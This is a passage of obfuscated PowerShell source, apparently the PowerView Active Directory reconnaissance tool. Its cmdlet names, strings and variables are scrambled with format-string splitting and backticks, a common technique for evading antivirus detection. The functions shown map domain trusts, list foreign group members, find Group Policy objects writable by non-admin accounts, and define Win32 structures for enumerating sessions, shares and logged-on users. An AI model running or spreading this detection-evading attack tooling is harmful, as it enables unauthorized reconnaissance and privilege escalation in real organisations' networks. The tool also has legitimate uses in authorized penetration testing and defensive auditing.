        if (${Ps`B`O`Und`paRAMEt`erS}[("{1}{2}{0}{3}"-f 'perti','P','ro','es')]) { ${SeArcHERARG`U`MEn`Ts}[("{1}{0}{2}" -f 'o','Pr','perties')] = ${P`R`OpeRtIes} }
        if (${ps`BounD`p`ArA`MeTeRS}[("{1}{0}{2}" -f'hBas','Searc','e')]) { ${sEARche`R`A`RgUMEnTS}[("{1}{3}{2}{0}" -f 'ase','Sear','B','ch')] = ${S`ear`ChbaSe} }
        if (${p`sBoUNd`PaRAmet`eRs}[("{0}{1}"-f 'Ser','ver')]) { ${Sea`RC`he`RarguMeNtS}[("{0}{1}{2}" -f'S','e','rver')] = ${s`eR`VeR} }
        if (${pSb`Ou`N`dPa`RameTERs}[("{2}{3}{0}{1}" -f 'co','pe','Search','S')]) { ${sEa`RChERARGU`mEn`TS}[("{0}{1}{2}" -f'SearchS','cop','e')] = ${sea`RcHsC`OpE} }
        if (${pSb`oU`Ndparam`eT`Ers}[("{1}{0}{2}" -f'ult','Res','PageSize')]) { ${s`eArC`hEra`R`gU`MEnTs}[("{3}{1}{2}{4}{0}"-f'e','Pag','eSi','Result','z')] = ${r`EsulT`pagESizE} }
        if (${pSB`OunDpaR`Am`EtErS}[("{0}{1}{3}{4}{2}"-f'S','e','rTimeLimit','rv','e')]) { ${sEAr`c`HerArGU`men`Ts}[("{2}{4}{1}{3}{0}" -f'imeLimit','er','Se','T','rv')] = ${S`eRVertIMel`im`iT} }
        if (${PsB`oU`N`dparAMetErS}[("{3}{1}{2}{0}" -f 'ks','ityMa','s','Secur')]) { ${SE`A`RcHE`RAr`GuMEnts}[("{0}{2}{1}" -f'Se','ks','curityMas')] = ${se`CuRi`TY`M`ASKs} }
        if (${P`S`B`oUNDpaRaMeTE`Rs}[("{1}{0}{2}"-f 'st','Tomb','one')]) { ${searC`HEr`Arg`UmeNtS}[("{0}{1}{2}" -f 'Tom','b','stone')] = ${t`OmB`sTo`NE} }
        if (${psbOu`NDpAr`A`MEt`eRS}[("{2}{3}{0}{1}" -f'en','tial','C','red')]) { ${s`EAR`C`hERaRGUmen`TS}[("{2}{1}{0}"-f'ntial','e','Cred')] = ${crEDe`NT`i`Al} }
        if (${P`sB`OUNDpaR`Am`EtErs}['Raw']) { ${SearCh`e`RaR`gUmenTs}['Raw'] = ${R`Aw} }
    }

    PROCESS {
        
        ${exCLUD`EgR`OUPS} = @(("{0}{1}"-f'U','sers'), ("{1}{0}{2}"-f'ain Us','Dom','ers'), ("{2}{1}{0}"-f 's','t','Gues'))

        &("{3}{2}{1}{4}{0}"-f'ainGroup','D','-','Get','om') @SearcherArguments | &("{0}{2}{1}" -f'Wher','ject','e-Ob') { ${ExClU`deGro`U`Ps} -notcontains ${_}."Sa`MaCC`Ou`NTNAME" } | &("{3}{2}{0}{1}"-f '-Objec','t','Each','For') {
            ${G`ROU`PnAME} = ${_}."SA`m`AcCoUn`TN`AmE"
            ${g`RO`U`P`d`iStINGuISHEDNAME} = ${_}."dIs`T`i`NgUishE`dNAMe"
            ${gR`oUpDo`MaiN} = ${g`ROu`PDiS`TiNGu`iS`hed`NaMe}.("{0}{1}{3}{2}"-f 'SubS','tri','g','n').Invoke(${grou`pdisTiNG`UI`S`HEd`NAme}.("{2}{0}{1}"-f'exO','f','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."m`eM`BER" | &("{1}{3}{2}{0}" -f't','F','ach-Objec','orE') {
                
                
                ${M`e`MbeR`doMa`in} = ${_}.("{2}{1}{0}"-f 'ng','Stri','Sub').Invoke(${_}.("{2}{0}{1}"-f'ndex','Of','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{2}{0}{1}{3}{4}" -f '5','-','CN=S-1-','21.*-.','*')) -or (${Gro`UpD`o`MAIN} -ne ${MembeRD`om`AIn})) {
                    ${mEMB`erdisTing`Uis`H`EdnaME} = ${_}
                    ${m`em`B`ERNaMe} = ${_}.("{1}{0}" -f'lit','Sp').Invoke(',')[0].("{1}{0}"-f'it','spl').Invoke('=')[1]

                    ${forE`I`GNg`RoU`pmEM`BEr} = &("{1}{2}{3}{0}" -f't','New-O','bj','ec') ("{0}{2}{1}" -f 'P','ct','SObje')
                    ${fORei`gnG`R`O`Upmem`BeR} | &("{3}{2}{1}{0}"-f'r','be','Mem','Add-') ("{1}{2}{0}{3}" -f 'p','Not','epro','erty') ("{1}{0}{2}" -f 'oupD','Gr','omain') ${grO`UpdoMA`iN}
                    ${F`oREIgngRO`UpM`e`MBER} | &("{1}{3}{2}{0}" -f 'er','Ad','b','d-Mem') ("{2}{1}{0}" -f 'rty','pe','Notepro') ("{1}{0}{2}" -f 'pNam','Grou','e') ${gr`oU`pName}
                    ${fo`REIGngRou`P`memb`Er} | &("{3}{1}{2}{0}" -f '-Member','d','d','A') ("{2}{1}{3}{0}" -f 'y','t','No','epropert') ("{1}{0}{4}{3}{2}" -f'u','Gro','guishedName','Distin','p') ${Gr`O`U`PDIsTIn`GUIsHe`d`NaMe}
                    ${F`oRe`igNgro`UPM`EmBer} | &("{2}{0}{1}"-f 'em','ber','Add-M') ("{0}{2}{1}" -f 'Notepr','erty','op') ("{1}{2}{0}"-f 'in','Member','Doma') ${m`e`mbe`RdOmaiN}
                    ${FO`RE`Ign`grOUpMe`mBer} | &("{0}{1}{2}" -f'Add-','M','ember') ("{2}{3}{0}{1}"-f 'ropert','y','No','tep') ("{3}{0}{1}{2}" -f'mber','Nam','e','Me') ${mEmb`E`RnAME}
                    ${fo`R`EIGNgR`oupMEm`BeR} | &("{0}{2}{1}"-f 'Ad','er','d-Memb') ("{0}{2}{1}" -f'Not','y','epropert') ("{2}{1}{5}{4}{0}{3}" -f'edNam','emberDistin','M','e','ish','gu') ${memBE`RdistINGUI`sh`ed`NaMe}
                    ${for`EiGnG`ROUpMe`m`B`eR}."P`Sob`JECT"."tyP`ENa`mES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{1}{2}{3}{6}{4}{0}{5}"-f 'oupMe','PowerVie','w.F','o','ignGr','mber','re'))
                    ${foReIgn`G`Ro`UPM`emBEr}
                }
            }
        }
    }
}


function Ge`T-DOmAinTru`StmAP`P`Ing {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{1}{3}"-f 'P','l','u','dProcess','SSho'}, '')]
    [OutputType({"{1}{3}{0}{4}{2}" -f'View.D','Powe','.NET','r','omainTrust'})]
    [OutputType({"{5}{7}{6}{1}{8}{2}{3}{4}{0}" -f '.LDAP','D','Tru','s','t','Po','w.','werVie','omain'})]
    [OutputType({"{3}{4}{1}{2}{0}"-f't.API','rView.DomainTru','s','Po','we'})]
    [CmdletBinding(DefaUlTPaRaMeTErSETnAME = {"{0}{1}" -f'LDA','P'})]
    Param(
        [Parameter(ParaMETeRSETNaME = 'API')]
        [Switch]
        ${a`pI},

        [Parameter(parAMEterSETnAME = 'NET')]
        [Switch]
        ${n`eT},

        [Parameter(PARaMEterSetNamE = "LD`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filt','er'})]
        [String]
        ${L`dAPf`ILTer},

        [Parameter(PaRAmETersETnAMe = "ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`Op`eRtiES},

        [Parameter(pAraMetERsETNAMe = "LD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Path','ADS'})]
        [String]
        ${S`e`ArCHBasE},

        [Parameter(paraMEterSEtNaME = "Ld`AP")]
        [Parameter(ParAmETERsetnAme = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{4}{3}" -f'Dom','ain','Controll','r','e'})]
        [String]
        ${S`ervER},

        [Parameter(ParAmEtErsetnAMe = "L`daP")]
        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{2}{1}" -f'On','vel','eLe'}, {"{1}{0}{2}" -f 'bt','Su','ree'})]
        [String]
        ${sEAr`ch`sc`OPe} = ("{0}{2}{1}"-f 'Sub','ee','tr'),

        [Parameter(PARaMETErSEtName = "lD`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${Resul`TpaG`e`SIZe} = 200,

        [Parameter(PArAmetersETnAME = "L`daP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${seRVeR`TI`M`ELiMit},

        [Parameter(pArAmETeRSETNAMe = "L`Dap")]
        [Switch]
        ${TO`MbSTo`Ne},

        [Parameter(ParAMeTersetNAMe = "lD`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EdEn`T`Ial} =   (  get-chILdITEm  varIAbLe:21gV7E ).vAlUE::"em`PTY"
    )

    
    ${SE`end`oM`AiNs} = @{}

    
    ${DoM`A`ins} = &("{0}{2}{1}"-f'New','Object','-') ("{5}{3}{1}{0}{2}{6}{4}"-f'S','.Collections.','ta','em','k','Syst','c')

    ${Dom`AIN`TRUs`TaRGuMEnTs} = @{}
    if (${PS`B`oUndp`A`RAmEte`RS}['API']) { ${dOMa`inTRustA`Rg`UMe`Nts}['API'] = ${A`pI} }
    if (${p`sbOU`NdPAr`A`mETeRs}['NET']) { ${D`omaintrusTAR`gu`m`ENTS}['NET'] = ${N`eT} }
    if (${p`Sb`ouNdP`A`RAmetERS}[("{2}{1}{0}"-f'lter','i','LDAPF')]) { ${dOM`AintrUstar`Gu`M`En`Ts}[("{2}{1}{0}" -f 'lter','DAPFi','L')] = ${Lda`p`FiLtER} }
    if (${PSBO`UnD`P`ARaMe`Ters}[("{3}{2}{0}{1}" -f 'i','es','opert','Pr')]) { ${do`maINTrU`St`ARguMe`N`Ts}[("{1}{0}{2}" -f 'roper','P','ties')] = ${PROP`ER`TI`eS} }
    if (${psbO`UN`dpA`RaMEteRS}[("{2}{0}{1}" -f'archBas','e','Se')]) { ${dOM`Ai`NTrUS`TaRGU`MeNTS}[("{1}{0}{2}"-f'rch','Sea','Base')] = ${SE`Arc`HbaSE} }
    if (${P`s`BoUNdparA`MetErS}[("{0}{1}{2}" -f'Se','r','ver')]) { ${d`oM`AIn`T`RustaRGU`M`EntS}[("{1}{0}" -f 'er','Serv')] = ${sE`RVEr} }
    if (${pSbO`UNdPaRAME`T`ERS}[("{1}{2}{3}{0}"-f'e','S','earch','Scop')]) { ${DOMA`intrUsta`R`g`UmE`NTS}[("{0}{2}{1}"-f 'Sea','e','rchScop')] = ${SeaR`C`H`ScOPe} }
    if (${Ps`BoU`N`DpArA`M`ETErS}[("{3}{2}{1}{0}" -f'e','geSiz','ultPa','Res')]) { ${d`OmaiNTR`USTa`R`G`Um`ENts}[("{0}{3}{1}{2}"-f'Result','i','ze','PageS')] = ${rE`S`ULTp`AGe`SiZe} }
    if (${PS`Bo`UNDPa`RamETe`Rs}[("{0}{3}{2}{1}"-f'Serv','it','m','erTimeLi')]) { ${do`m`AI`N`TrusTArg`Ume`Nts}[("{4}{0}{2}{3}{1}"-f'v','it','erTim','eLim','Ser')] = ${se`R`Ve`Rt`imeLimit} }
    if (${p`SBOU`NDP`ARa`me`TERS}[("{2}{0}{1}"-f 'bst','one','Tom')]) { ${D`OmaINtruSt`A`Rgu`Me`NTs}[("{0}{2}{1}" -f'To','one','mbst')] = ${ToMb`S`TOnE} }
    if (${P`sbou`NDPaRa`mETE`Rs}[("{0}{1}{2}"-f'Creden','t','ial')]) { ${Do`ma`INt`RU`sT`A`RGuMeNtS}[("{2}{1}{0}" -f 'ntial','ede','Cr')] = ${Cre`De`NT`ial} }

    
    if (${psbOUND`pA`RA`Me`TERs}[("{0}{2}{1}" -f'Crede','al','nti')]) {
        ${cU`R`RE`NTdOmaIN} = (&("{0}{3}{2}{1}"-f 'Ge','in','Doma','t-') -Credential ${crEDe`NT`i`Al})."n`AMe"
    }
    else {
        ${CUrre`NtD`oMAin} = (&("{2}{1}{0}"-f'ain','m','Get-Do'))."N`AMe"
    }
    ${d`O`MAins}.("{1}{0}"-f'h','Pus').Invoke(${C`UrReN`TdoMAiN})

    while(${DO`maI`Ns}."CO`Unt" -ne 0) {

        ${d`OM`AiN} = ${Do`m`AinS}.("{1}{0}" -f 'p','Po').Invoke()

        
        if (${dOm`AIN} -and (${dOmA`IN}.("{1}{0}"-f'im','Tr').Invoke() -ne '') -and (-not ${SEE`N`DOmai`NS}.("{0}{3}{2}{1}" -f'C','Key','ains','ont').Invoke(${D`oMa`in}))) {

            &("{3}{2}{0}{1}" -f'rbo','se','e','Write-V') ('[Get-Do'+'m'+'a'+'inTrust'+'Mapp'+'in'+'g] '+'Enum'+'er'+'ating '+'trusts'+' '+'for'+' '+'domai'+'n:'+' '+"'$Domain'")

            
            ${n`UlL} = ${SEe`N`doMA`ins}.("{0}{1}" -f 'A','dd').Invoke(${d`OMAiN}, '')

            try {
                
                ${DOma`inT`Ru`StArGUm`eNTs}[("{0}{2}{1}" -f'Do','ain','m')] = ${dOm`A`iN}
                ${TrUS`TS} = &("{1}{2}{0}" -f 't','Get-Domain','Trus') @DomainTrustArguments

                if (${t`RUSts} -isnot [System.Array]) {
                    ${trU`sts} = @(${t`RUSTS})
                }

                
                if (${PS`cm`dLET}.pARAmETErSETnaME -eq 'NET') {
                    ${fORES`TtRuST`ARg`UMenTS} = @{}
                    if (${PS`B`oUNDPAramEt`ERs}[("{1}{0}"-f'rest','Fo')]) { ${F`orE`SttRuST`Ar`guM`enTs}[("{1}{0}" -f't','Fores')] = ${f`oreST} }
                    if (${ps`Bo`UndpA`RametE`Rs}[("{0}{1}{2}"-f'Credent','ia','l')]) { ${fOres`TTRuSTA`RG`Um`ENtS}[("{1}{2}{0}" -f 'l','Cre','dentia')] = ${c`ReDE`NTI`AL} }
                    ${tRu`StS} += &("{0}{3}{1}{2}"-f 'Get-Fo','ru','st','restT') @ForestTrustArguments
                }

                if (${T`RUs`TS}) {
                    if (${t`RusTs} -isnot [System.Array]) {
                        ${T`RUS`Ts} = @(${trU`STS})
                    }

                    
                    ForEach (${tru`st} in ${tRuS`Ts}) {
                        if (${t`RUst}."SOUr`cE`NAmE" -and ${tr`USt}."T`ARget`NAME") {
                            
                            ${n`UlL} = ${d`OMa`INs}.("{0}{1}" -f 'P','ush').Invoke(${tru`ST}."TARGeTN`A`me")
                            ${t`Rust}
                        }
                    }
                }
            }
            catch {
                &("{2}{3}{4}{0}{1}"-f 'erbo','se','Wri','te-','V') ('[Get-Doma'+'inT'+'r'+'ustMapping'+'] '+'Error:'+' '+"$_")
            }
        }
    }
}


function gE`T`-GPOde`lEg`AtIoN {


    [CmdletBinding()]
    Param (
        [String]
        ${gP`Ona`mE} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${P`A`gEsi`zE} = 200
    )

    ${e`Xc`L`UsiONS} = @(("{0}{1}{2}" -f 'SYS','T','EM'),("{1}{0}{2}{3}" -f'oma','D','in',' Admins'),("{2}{0}{3}{1}"-f 't','prise Admins','En','er'))

    ${f`or`EsT} =  ( Dir  ('vA'+'rIaBL'+'E:Ht9') ).vaLuE::("{2}{1}{0}"-f'est','r','GetCurrentFo').Invoke()
    ${dO`Main`l`Ist} = @(${f`ORESt}."dom`AINs")
    ${Dom`AInS} = ${dOmA`I`NlISt} | &("{1}{0}"-f 'h','foreac') { ${_}.("{3}{1}{4}{2}{0}" -f 'Entry','ire','ry','GetD','cto').Invoke() }
    foreach (${DO`Ma`in} in ${dO`MaiNS}) {
        ${F`IlteR} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${SEA`R`cH`er} = &("{1}{0}{2}" -f'-Ob','New','ject') ("{5}{0}{11}{3}{4}{9}{8}{7}{6}{2}{10}{1}" -f'tem','er','es.Director','ire','ctor','Sys','vic','er','S','y','ySearch','.D')
        ${sEa`RC`her}."sE`ArcHro`ot" = ${doMa`iN}
        ${SE`AR`CHEr}."F`ilT`eR" = ${FIlt`ER}
        ${SeA`R`cHeR}."PA`G`EsiZe" = ${p`AGesi`ZE}
        ${sEA`Rch`Er}."s`EarC`HScopE" = ("{1}{0}"-f 'e','Subtre')
        ${l`iStgPO} = ${s`EarC`HEr}.("{1}{0}{2}" -f'n','Fi','dAll').Invoke()
        foreach (${g`PO} in ${L`I`sTgPo}){
            ${a`Cl} = ([ADSI]${G`pO}."P`ATh")."OB`Jec`TseC`U`Rity"."aCcE`ss" | &('?') {${_}."AcTivE`d`I`REcTor`YRi`gh`TS" -match ("{1}{0}" -f 'e','Writ') -and ${_}."a`Cc`e`ssCO`NtroLtyPe" -eq ("{1}{0}"-f 'ow','All') -and  ${E`xC`l`USIONS} -notcontains ${_}."IdeNT`It`yRe`FERe`N`cE".("{1}{0}"-f 'ng','toStri').Invoke().("{1}{0}" -f't','spli').Invoke("\")[1] -and ${_}."i`dE`N`TitYrE`FERe`NcE" -ne ("{0}{1}{2}" -f 'CREA','TOR OWN','ER')}
        if (${A`CL} -ne ${NU`ll}){
            ${g`Poa`cl} = &("{0}{1}{2}"-f'N','e','w-Object') ("{1}{2}{0}" -f 'ct','p','sobje')
            ${gpo`A`Cl} | &("{2}{1}{0}"-f '-Member','dd','A') ("{3}{2}{1}{0}"-f 'ty','er','p','Notepro') ("{1}{0}" -f'DSPath','A') ${g`PO}."Pr`oPErT`IeS"."ad`SP`Ath"
            ${Gp`O`AcL} | &("{0}{1}{2}" -f 'Add-Memb','e','r') ("{1}{3}{2}{0}"-f 'operty','N','tepr','o') ("{3}{1}{0}{2}" -f'p','Dis','layName','GPO') ${G`pO}."ProP`eRTI`eS"."dISpL`AyN`AmE"
            ${G`poa`Cl} | &("{0}{2}{3}{1}" -f 'A','ber','dd','-Mem') ("{1}{2}{3}{0}" -f 'y','Notepro','per','t') ("{0}{3}{1}{4}{2}" -f'Id','yRef','nce','entit','ere') ${A`cL}."ide`N`T`it`YRE`FerENCe"
            ${G`PO`ACL} | &("{1}{0}{2}"-f '-Membe','Add','r') ("{2}{0}{1}{3}"-f'ep','rope','Not','rty') ("{3}{2}{4}{0}{5}{6}{1}"-f 'R','ts','cti','A','veDirectory','ig','h') ${a`cl}."aCti`V`EDIR`ectoRY`RigH`TS"
            ${GP`o`AcL}
        }
        }
    }
}











${M`Od} = &("{3}{0}{2}{1}{4}"-f 'ew-InMem','yM','or','N','odule') -ModuleName ("{0}{1}" -f 'Win','32')




${sA`MACcouNTTYp`E`E`NuM} = &("{0}{1}" -f 'psenu','m') ${M`OD} ("{0}{6}{2}{4}{5}{1}{3}{7}"-f'PowerView','E','Sam','nu','Acco','untType','.','m') ("{1}{0}{2}"-f 'I','U','nt32') @{
    ("{2}{0}{1}{3}"-f'MAIN_','OB','DO','JECT')                   =   ("{2}{1}{0}{3}" -f '00','0','0x0','0000')
    ("{1}{0}{2}" -f'P_OBJEC','GROU','T')                    =   ("{1}{2}{3}{0}"-f'0000','0','x1','000')
    ("{3}{0}{2}{4}{1}" -f'TY_','ECT','GROU','NON_SECURI','P_OBJ')       =   ("{2}{1}{0}" -f '001','0000','0x1')
    ("{2}{0}{1}{3}"-f'_OB','JE','ALIAS','CT')                    =   ("{2}{1}{0}" -f'20000000','x','0')
    ("{5}{4}{1}{2}{0}{3}" -f '_ALIAS_OBJE','EC','URITY','CT','_S','NON')       =   ("{0}{2}{3}{1}"-f '0x2','001','000','0')
    ("{2}{0}{1}{3}" -f'R_OB','JE','USE','CT')                     =   ("{0}{2}{1}"-f '0x30','0000','00')
    ("{3}{2}{0}{1}" -f '_ACCOU','NT','E','MACHIN')                 =   ("{1}{2}{0}" -f'0001','0x30','00')
    ("{0}{2}{1}{3}" -f 'TRU','CO','ST_AC','UNT')                   =   ("{0}{3}{2}{1}" -f '0x3000','2','00','0')
    ("{4}{1}{2}{3}{0}" -f 'P','_B','ASIC_GR','OU','APP')                 =   ("{2}{0}{1}"-f '0','000000','0x4')
    ("{3}{1}{0}{2}{4}"-f'G','Y_','ROU','APP_QUER','P')                 =   ("{2}{1}{0}" -f '1','0','0x400000')
    ("{4}{1}{0}{3}{2}"-f'OU','CC','E_MAX','NT_TYP','A')                =   ("{2}{0}{1}"-f'ffff','f','0x7ff')
}


${GRO`Up`TY`PeEn`UM} = &("{0}{1}"-f 'pse','num') ${M`oD} ("{0}{4}{1}{3}{2}"-f'Po','GroupType','num','E','werView.') ("{0}{1}"-f'UInt3','2') @{
    ("{1}{2}{3}{0}" -f'EM','CREA','TED_','BY_SYST')               =   ("{2}{1}{0}" -f'00000001','x','0')
    ("{2}{0}{3}{1}" -f'L','L_SCOPE','G','OBA')                    =   ("{0}{1}{2}{3}" -f'0','x000000','0','2')
    ("{1}{2}{0}{3}"-f'_LOCAL_SCOP','D','OMAIN','E')              =   ("{0}{1}{2}{3}" -f'0','x000','0000','4')
    ("{4}{2}{0}{3}{1}"-f 'ERSAL','PE','NIV','_SCO','U')                 =   ("{3}{0}{1}{2}" -f 'x','0000','0008','0')
    ("{1}{2}{0}" -f'C','A','PP_BASI')                       =   ("{0}{2}{1}{3}"-f '0x000','0','0','010')
    ("{1}{2}{0}" -f'ERY','APP_','QU')                       =   ("{2}{3}{1}{0}" -f '0','0002','0x00','0')
    ("{1}{2}{0}" -f 'ITY','SEC','UR')                        =   ("{2}{3}{0}{1}" -f '000','000','0x8','0')
} -Bitfield


${UaC`E`NUm} = &("{0}{1}" -f 'ps','enum') ${M`OD} ("{4}{2}{3}{0}{1}" -f 'ie','w.UACEnum','ower','V','P') ("{1}{2}{0}" -f'2','UIn','t3') @{
    ("{2}{0}{1}"-f'C','RIPT','S')                          =   1
    ("{4}{1}{0}{3}{2}"-f 'S','NTDI','BLE','A','ACCOU')                  =   2
    ("{0}{1}{3}{2}"-f 'HOMEDIR','_','EQUIRED','R')                =   8
    ("{0}{1}"-f 'LOCKOU','T')                         =   16
    ("{2}{3}{4}{0}{1}" -f'RE','QD','PASS','WD_','NOT')                  =   32
    ("{4}{1}{2}{0}{3}"-f'ANG','SSWD_C','ANT_CH','E','PA')              =   64
    ("{3}{4}{0}{1}{5}{2}"-f'XT','_','_ALLOWED','ENCRYPTED_T','E','PWD')      =   128
    ("{2}{3}{0}{1}" -f'CCOUN','T','TEMP_DU','PLICATE_A')          =   256
    ("{2}{1}{0}{3}"-f'MAL_','R','NO','ACCOUNT')                  =   512
    ("{4}{3}{2}{0}{1}" -f'UST_ACCO','UNT','_TR','IN','INTERDOMA')       =   2048
    ("{3}{1}{4}{0}{2}{5}"-f 'STATION_TRU','OR','ST','W','K','_ACCOUNT')       =   4096
    ("{3}{2}{0}{4}{5}{1}" -f 'RV','OUNT','E','S','ER_TRUST_','ACC')            =   8192
    ("{0}{1}{4}{3}{2}"-f 'D','ONT_EX','WORD','ASS','PIRE_P')            =   65536
    ("{0}{1}{3}{2}"-f 'M','NS_LOG','CCOUNT','ON_A')               =   131072
    ("{2}{1}{4}{0}{3}"-f 'D_REQUI','RTCA','SMA','RED','R')              =   262144
    ("{3}{0}{1}{2}"-f 'TE','D_FOR_DELEGATIO','N','TRUS')          =   524288
    ("{0}{3}{2}{1}" -f 'N','TED','T_DELEGA','O')                   =   1048576
    ("{0}{3}{1}{4}{2}" -f'US','_K','Y_ONLY','E_DES','E')                =   2097152
    ("{0}{2}{1}{3}"-f 'DONT_RE','REAU','Q_P','TH')                =   4194304
    ("{0}{2}{1}" -f'PA','_EXPIRED','SSWORD')                =   8388608
    ("{0}{5}{3}{2}{1}{6}{4}" -f 'TR','O_AUTH','T','STED_','EGATION','U','_FOR_DEL')  =   16777216
    ("{1}{0}{3}{5}{4}{2}"-f'R','PARTIAL_SEC','CCOUNT','ET','_A','S')         =   67108864
} -Bitfield


${wTs`coNne`cT`STa`Te} = &("{2}{0}{1}" -f 'en','um','ps') ${m`od} ("{0}{1}{3}{4}{2}"-f'WT','S_','SS','CO','NNECTSTATE_CLA') ("{0}{1}"-f'UInt','16') @{
    ("{0}{1}"-f'Acti','ve')       =    0
    ("{2}{0}{1}"-f 'e','cted','Conn')    =    1
    ("{0}{1}{2}{3}"-f 'Co','nnec','tQ','uery') =    2
    ("{2}{0}{1}" -f'ha','dow','S')       =    3
    ("{1}{0}{2}"-f 'c','Disconne','ted') =    4
    ("{1}{0}"-f 'e','Idl')         =    5
    ("{1}{0}" -f 'ten','Lis')       =    6
    ("{0}{1}"-f'R','eset')        =    7
    ("{1}{0}"-f 'own','D')         =    8
    ("{1}{0}" -f 't','Ini')         =    9
}


${WtS_Se`S`s`iOn_INFO`_1} = &("{1}{0}"-f 'uct','str') ${M`Od} ("{2}{3}{0}{4}{1}{5}"-f'ew.RDP','onInf','Power','Vi','Sessi','o') @{
    ("{0}{2}{1}" -f'Exec','nvId','E') = &("{0}{1}"-f'fie','ld') 0 ("{0}{2}{1}" -f 'U','2','Int3')
    ("{0}{1}"-f'Sta','te') = &("{0}{1}"-f 'fi','eld') 1 ${WT`SConneC`TS`TA`Te}
    ("{1}{0}{2}" -f 'ion','Sess','Id') = &("{1}{0}"-f 'eld','fi') 2 ("{0}{1}" -f'UI','nt32')
    ("{1}{2}{0}" -f 'e','pSessionN','am') = &("{0}{1}" -f'f','ield') 3 ("{2}{0}{1}"-f 'in','g','Str') -MarshalAs @(("{2}{0}{1}"-f'WS','tr','LP'))
    ("{1}{2}{0}"-f 'tName','pHo','s') = &("{1}{0}"-f'ld','fie') 4 ("{0}{1}"-f'St','ring') -MarshalAs @(("{0}{1}"-f'LP','WStr'))
    ("{1}{0}{2}" -f'ser','pU','Name') = &("{1}{0}"-f'eld','fi') 5 ("{0}{1}{2}" -f 'S','tri','ng') -MarshalAs @(("{0}{1}"-f 'LPWSt','r'))
    ("{1}{3}{0}{2}"-f 'nN','pD','ame','omai') = &("{0}{1}" -f 'fi','eld') 6 ("{1}{2}{0}"-f 'ing','St','r') -MarshalAs @(("{1}{0}{2}"-f 'WS','LP','tr'))
    ("{0}{1}{3}{2}" -f 'p','F','Name','arm') = &("{0}{1}" -f 'fie','ld') 7 ("{1}{2}{0}" -f 'ring','S','t') -MarshalAs @(("{0}{2}{1}"-f 'L','WStr','P'))
}


${WTS_cL`IEN`T_`Addre`sS} = &("{2}{1}{0}"-f 'ct','ru','st') ${M`Od} ("{4}{0}{2}{3}{1}"-f 'TS_CLIENT','RESS','_','ADD','W') @{
    ("{3}{0}{4}{2}{1}" -f'ssF','ly','i','Addre','am') = &("{0}{1}" -f'fi','eld') 0 ("{1}{0}" -f '2','UInt3')
    ("{0}{2}{1}" -f'Ad','ress','d') = &("{1}{0}" -f'eld','fi') 1 ("{2}{1}{0}" -f ']','e[','Byt') -MarshalAs @(("{1}{2}{0}"-f'ValArray','B','y'), 20)
}


${Sh`ArE_IN`Fo`_1} = &("{0}{1}{2}" -f'str','u','ct') ${m`OD} ("{2}{5}{3}{0}{4}{1}"-f 'erVie','Info','P','w','w.Share','o') @{
    ("{0}{1}"-f 'Na','me') = &("{1}{0}"-f 'eld','fi') 0 ("{0}{1}{2}" -f'Stri','n','g') -MarshalAs @(("{0}{1}{2}" -f'LPW','St','r'))
    ("{1}{0}"-f 'pe','Ty') = &("{0}{1}"-f 'fie','ld') 1 ("{0}{1}" -f'UInt3','2')
    ("{0}{1}"-f'Re','mark') = &("{0}{1}"-f'fiel','d') 2 ("{2}{1}{0}"-f'g','trin','S') -MarshalAs @(("{1}{0}"-f'r','LPWSt'))
}


${wkSta`_U`seR`_`InFo_1} = &("{0}{1}" -f 'stru','ct') ${M`oD} ("{4}{0}{3}{1}{2}" -f'Log','rI','nfo','gedOnUse','PowerView.') @{
    ("{1}{2}{0}" -f 'Name','Us','er') = &("{0}{1}" -f 'fiel','d') 0 ("{0}{1}" -f'St','ring') -MarshalAs @(("{0}{1}"-f'LPWSt','r'))
    ("{1}{0}{2}" -f 'nDom','Logo','ain') = &("{1}{0}"-f'eld','fi') 1 ("{0}{1}"-f'Str','ing') -MarshalAs @(("{0}{1}{2}" -f 'LP','WS','tr'))
    ("{2}{1}{0}{3}"-f 'hDo','ut','A','mains') = &("{0}{1}"-f'fie','ld') 2 ("{0}{1}"-f'St','ring') -MarshalAs @(("{0}{1}" -f 'LPWS','tr'))
    ("{0}{1}{3}{2}"-f 'Log','onSer','r','ve') = &("{1}{0}"-f'ield','f') 3 ("{2}{0}{1}"-f'in','g','Str') -MarshalAs @(("{1}{0}"-f 'r','LPWSt'))
}


${s`es`Si`o`N_iNFo_`10} = &("{1}{0}"-f'ct','stru') ${M`od} ("{5}{6}{4}{3}{1}{0}{2}" -f 'n','essio','Info','S','.','Po','werView') @{
    ("{0}{1}"-f'CN','ame') = &("{0}{1}" -f'fiel','d') 0 ("{1}{0}" -f'ng','Stri') -MarshalAs @(("{1}{0}"-f 'r','LPWSt'))
    ("{1}{2}{0}" -f 'Name','Use','r') = &("{0}{1}" -f 'f','ield') 1 ("{1}{0}"-f 'tring','S') -MarshalAs @(("{1}{0}"-f 'Str','LPW'))
    ("{1}{0}"-f'ime','T') = &("{1}{0}" -f 'ld','fie') 2 ("{1}{2}{0}"-f'2','UInt','3')
    ("{0}{1}" -f'Idl','eTime') = &("{1}{0}"-f'ld','fie') 3 ("{1}{0}" -f 'Int32','U')
}


${s`iD_nAM`e`_uSe} = &("{1}{0}" -f'um','psen') ${M`oD} ("{1}{0}{2}"-f'NAME','SID_','_USE') ("{1}{0}"-f'16','UInt') @{
    ("{0}{2}{1}" -f 'S','dTypeUser','i')             = 1
    ("{1}{0}{2}"-f 'p','SidTy','eGroup')            = 2
    ("{0}{3}{2}{4}{1}" -f 'S','ain','TypeD','id','om')           = 3
    ("{3}{1}{0}{2}"-f 'i','peAl','as','SidTy')            = 4
    ("{1}{2}{4}{0}{3}" -f 'WellKnown','Si','d','Group','Type')   = 5
